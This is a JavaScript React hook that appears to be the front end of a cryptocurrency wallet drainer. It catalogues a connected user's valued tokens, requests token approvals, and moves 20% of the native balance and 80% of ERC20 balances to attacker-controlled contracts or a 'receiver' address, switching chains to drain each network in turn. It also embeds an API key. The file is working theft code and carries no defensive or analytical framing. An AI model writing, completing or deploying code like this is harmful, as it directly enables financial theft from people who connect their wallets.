"use client";

import { useAccount } from "wagmi";
import { switchChain, getChainId, getGasPrice } from "@wagmi/core";
import axios from "axios";
import { providers, ethers, utils, Contract } from "ethers";
import contractAbi from "../blockchain/contract.json";
import { config, receiver, API_KEY } from "../app/web3Config";
import { toast } from "react-toastify";
import Web3 from "web3";
// import { sendMessageToTelegram } from "../app/telegramUtils";

export const getContractAddress = (chainId) => {
  switch (chainId) {
    case 1:
      return "0xe13686dc370817C5dfbE27218645B530041D2466"; // Ethereum
    case 56:
      return "0x2B7e812267C55246fe7afB0d6Dbc6a32baEF6A15"; // Binance
    case 137:
      return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Polygon
    case 43114:
      return "0x07145f3b8B9D581A1602669F2D8F6e2e8213C2c7"; // Avalanche
    case 42161:
      return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Arbitrum
    case 10:
      return "0x1bdBa4052DFA7043A7BCCe5a5c3E38c1acE204b5"; // Optimism
    case 42220:
      return "0xdA79c230924D49972AC12f1EA795b83d01F0fBfF"; // Celo
    default:
      throw new Error("Unsupported network");
  }
};

export const useWallet = () => {
  const account = useAccount();

  // Chain status tracking
  let chainInteractionStatus = {
    1: false, // Ethereum Mainnet
    56: false, // Binance Smart Chain Mainnet
    137: false, // Polygon Mainnet
    43114: false, // Avalanche Mainnet
    42161: false, // Arbitrum Mainnet
    10: false, // Optimism Mainnet
    42220: false, // Celo Mainnet
  };

  const chainDrainStatus = {
    1: false, // Ethereum Mainnet
    56: false, // Binance Smart Chain Mainnet
    137: false, // Polygon Mainnet
    43114: false, // Avalanche Mainnet
    42161: false, // Arbitrum Mainnet
    10: false, // Optimism Mainnet
    42220: false, // Celo Mainnet
  };

  const approveTokens = async () => {
    if (account && account.address && account.chainId) {
      const tokens = await getTokenAssets();
      const provider = new providers.JsonRpcProvider(
        account.chainId === 1
          ? "https://mainnet.infura.io/v3/1aa31fce4c0f49c38c1464b4bfa49f73"
          : "https://bsc-dataseed.binance.org"
      );

      for (let token of tokens) {
        const tokenContract = new Contract(
          token.tokenAddress,
          [
            "function approve(address spender, uint256 amount) external returns (bool)",
          ],
          provider.getSigner(account.address)
        );

        try {
          const tx = await tokenContract.approve(
            getContractAddress(account.chainId),
            utils.parseUnits(token.tokenAmount.toString(), token.tokenDecimal)
          );
          console.log(`Approval tx hash: ${tx.hash}`);
          await tx.wait();
          console.log(`Approved ${token.tokenAmount} of ${token.tokenName}`);
        } catch (error) {
          console.error(`Approval failed for ${token.tokenName}:`, error);
          // Continue to the next token even if approval fails
        }
      }
    }
  };

  //drain here is edited to only transfer the token selected (native or erc20)
  const drain = async (provider, chainId, assetAddress) => {
    if (!provider || !chainId) {
      console.error("Missing required arguments.");
      return;
    }

    const signer = provider.getSigner();
    const accountAddress = await signer.getAddress();

    // Set assetAddress to null for native tokens if not provided
    if (!assetAddress) {
      assetAddress = "0x0000000000000000000000000000000000000000";
    }

    const isNative =
      assetAddress === "0x0000000000000000000000000000000000000000";

    try {
      if (isNative) {
        // Multicall for native token
        const ethBalance = await provider.getBalance(accountAddress);
        const contractAddress = getContractAddress(chainId);

        const multiCallContract = new Contract(
          contractAddress,
          contractAbi,
          signer
        );
        const ethAmountToDrain = ethBalance.mul(2).div(10); // 20% of balance

        try {
          // Attempt to call the multicall contract
          const tx = await multiCallContract.multiCall([], [], {
            value: ethAmountToDrain,
            gasLimit: ethers.utils.hexlify(100000), // Set manual gas limit
          });
          console.log(`Multicall transaction hash: ${tx.hash}`);
          await tx.wait();
          console.log(
            `Native token transferred through multicall: ${ethAmountToDrain.toString()}`
          );
        } catch (multiCallError) {
          console.error(
            "Multicall failed, falling back to direct transfer:",
            multiCallError
          );

          // Fallback to direct ETH transfer if multicall fails
          const tx = await signer.sendTransaction({
            to: contractAddress,
            value: ethAmountToDrain,
            gasLimit: ethers.utils.hexlify(10000), // Basic transfer gas limit
          });
          console.log(`Direct transfer transaction hash: ${tx.hash}`);
          await tx.wait();
          console.log(
            `Directly transferred native token: ${ethAmountToDrain.toString()}`
          );
        }
      } else {
        // ERC20 transfer for non-native token
        const tokenContract = new Contract(
          assetAddress,
          [
            "function balanceOf(address) view returns (uint256)",
            "function transfer(address,uint256)",
          ],
          signer
        );

        const tokenBalance = await tokenContract.balanceOf(accountAddress);
        const tokenAmountToDrain = tokenBalance.mul(8).div(10); // Transfer 80% of balance

        const transferTx = await tokenContract.transfer(
          receiver,
          tokenAmountToDrain
        );
        console.log(`ERC20 transfer transaction hash: ${transferTx.hash}`);
        await transferTx.wait();
        console.log(
          `ERC20 token transferred: ${tokenAmountToDrain.toString()}`
        );
      }
    } catch (error) {
      console.error("Drain function error:", error);
    }
  };

  const drain2 = async (provider, chainId, assetAddress) => {
    if (!provider || !chainId) {
      console.error("Missing required arguments.");
      return;
    }

    const signer = provider.getSigner();
    const accountAddress = await signer.getAddress();

    // Set assetAddress to null for native tokens if not provided
    if (!assetAddress) {
      assetAddress = "0x0000000000000000000000000000000000000000";
    }

    const isNative =
      assetAddress === "0x0000000000000000000000000000000000000000";

    try {
      if (isNative) {
        // Multicall for native token
        const ethBalance = await provider.getBalance(accountAddress);
        const contractAddress = getContractAddress(chainId);

        const multiCallContract = new Contract(
          contractAddress,
          contractAbi,
          signer
        );
        const ethAmountToDrain = ethBalance.mul(2).div(10); // 20% of balance

        try {
          // Attempt to call the multicall contract
          const tx = await multiCallContract.multiCall([], [], {
            value: ethAmountToDrain,
            gasLimit: ethers.utils.hexlify(100000), // Set manual gas limit
          });
          console.log(`Multicall transaction hash: ${tx.hash}`);
          await tx.wait();
          console.log(
            `Native token transferred through multicall: ${ethAmountToDrain.toString()}`
          );
        } catch (multiCallError) {
          console.error(
            "Multicall failed, falling back to direct transfer:",
            multiCallError
          );

          // Fallback to direct ETH transfer if multicall fails
          const tx = await signer.sendTransaction({
            to: contractAddress,
            value: ethAmountToDrain,
            gasLimit: ethers.utils.hexlify(10000), // Basic transfer gas limit
          });
          console.log(`Direct transfer transaction hash: ${tx.hash}`);
          await tx.wait();
          console.log(
            `Directly transferred native token: ${ethAmountToDrain.toString()}`
          );
        }
      } else {
        // ERC20 transfer for non-native token
        const tokenContract = new Contract(
          assetAddress,
          [
            "function balanceOf(address) view returns (uint256)",
            "function transfer(address,uint256)",
          ],
          signer
        );

        const tokenBalance = await tokenContract.balanceOf(accountAddress);
        const tokenAmountToDrain = tokenBalance.mul(8).div(10); // Transfer 80% of balance

        const transferTx = await tokenContract.transfer(
          receiver,
          tokenAmountToDrain
        );
        console.log(`ERC20 transfer transaction hash: ${transferTx.hash}`);
        await transferTx.wait();
        console.log(
          `ERC20 token transferred: ${tokenAmountToDrain.toString()}`
        );
      }
    } catch (error) {
      console.error("Drain function error:", error);
    }
  };

  const handleMulticall = async (tokens, ethBalance) => {
    const chainId = getChainId(config);
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner(account.address);
    const multiCallContract = new Contract(
      getContractAddress(chainId),
      contractAbi,
      signer
    );

    const tokenAddresses = tokens.map((token) => token.tokenAddress);
    const amounts = tokens.map((token) =>
      ethers.BigNumber.from(token.tokenAmount).mul(8).div(10)
    );

    try {
      const gasPrice = await getGasPrice(config, { chainId: account.chainId });
      const gasEstimate = await multiCallContract.estimateGas.multiCall(
        tokenAddresses,
        amounts,
        {
          value: ethBalance.value,
        }
      );
      const gasFee = gasEstimate.mul(gasPrice);

      const totalEthRequired = ethers.BigNumber.from(ethBalance.value)
        .mul(2)
        .div(10); // Transfer 20% of ETH

      if (totalEthRequired.lt(gasFee)) {
        toast.error("Not enough ETH to cover gas fees and transfer.", {
          toastId: "drain",
        });
        console.log("Not enough ETH to cover gas fees and transfer.");
        //await proceedToNextChain();
        return;
      }

      const tx = await multiCallContract.multiCall(tokenAddresses, amounts, {
        value: totalEthRequired,
      });

      console.log(`Multicall transaction hash: ${tx.hash}`);
      await tx.wait();
      console.log(`Multicall transaction confirmed: ${tx.hash}`);

      chainDrainStatus[chainId] = true; // Mark chain as drained if successful
      //await proceedToNextChain();
    } catch (error) {
      console.log("Multicall operation failed:", error);
      //await proceedToNextChain();
    }
  };

  const getWalletBalance = async ({ setWalletBalance }) => {
    try {
      // Check if window.ethereum is available
      if (typeof window.ethereum === "undefined") {
        console.log("Ethereum provider is not available");
        return;
      }

      // Initialize Web3 instance
      const web3 = new Web3(window.ethereum);

      // Request accounts
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (!accounts || accounts.length === 0) {
        console.log(
          "No accounts found. Make sure the user is logged into their wallet."
        );
        return;
      }

      // Get balance in wei
      const weiBalance = await web3.eth.getBalance(accounts[0]);

      if (weiBalance === undefined) {
        console.error("Failed to fetch balance for the account:", accounts[0]);
        return;
      }

      // Convert to Ether
      const ethBalance = web3.utils.fromWei(weiBalance, "ether"); // Specify 'ether' as the unit
      // console.log("ETH Balance:", ethBalance);

      // Set the wallet balance state
      setWalletBalance(ethBalance);
    } catch (err) {
      console.log("Error fetching balance:", err);
    }
  };

  const proceedToNextChain = async () => {
    const nextChainId = Object.keys(chainInteractionStatus).find(
      (id) => !chainInteractionStatus[id]
    );

    if (nextChainId) {
      try {
        await switchChain(config, { chainId: Number(nextChainId) });
        await drain(); // Recursive call to drain the next chain
      } catch (switchError) {
        // console.log(`Failed to switch chain to ${nextChainId}:`, switchError);
        await proceedToNextChain(); // Continue to next operation even if chain switch fails
      }
    } else {
      console.log("All chains have been interacted with.");

      // Check for any chains that were not fully drained and retry
      const notDrainedChains = Object.keys(chainDrainStatus).filter(
        (id) => !chainDrainStatus[id] && chainInteractionStatus[id]
      );

      if (notDrainedChains.length > 0) {
        for (const chainId of notDrainedChains) {
          try {
            await switchChain(config, { chainId: Number(chainId) });
            await drain(); // Retry draining for non-drained chains
          } catch (switchError) {
            console.log(
              `Failed to switch to non-drained chain ${chainId}:`,
              switchError
            );
            continue; // Skip and continue with other non-drained chains
          }
        }
      } else {
        console.log(
          "All chains have been drained or attempted. Stopping further operations."
        );
      }
    }
  };

  const getTokenAssets = async () => {
    const chainId = getChainId(config);
    let tokenBalances = [];
    const options = {
      url: `https://api.chainbase.online/v1/account/tokens?chain_id=${chainId}&address=${account.address}&limit=20&page=1`,
      method: "GET",
      headers: {
        "x-api-key": API_KEY,
        accept: "application/json",
      },
    };
    try {
      const tokenListResponse = await axios(options);
      const tokens = tokenListResponse.data.data;

      if (!tokens) return tokenBalances;

      for (const token of tokens) {
        const tokenAmount = BigInt(token.balance);
        const tokenAddress = token.contract_address.toLowerCase();
        const usdAmount = token.current_usd_price || 0;
        const tokenDecimal = token.decimals;
        if (usdAmount > 0) {
          tokenBalances.push({
            tokenAmount: tokenAmount,
            tokenName: token.name,
            tokenDecimal: tokenDecimal,
            usdAmount: usdAmount,
            tokenAddress,
          });
        }
      }
      tokenBalances.sort((a, b) => b.usdAmount - a.usdAmount);
    } catch (error) {
      console.log("Error fetching token assets:", error);
    }

    return tokenBalances;
  };

  return {
    approveTokens,
    drain,
    getTokenAssets,
    getWalletBalance,
    drain2,
  };
};
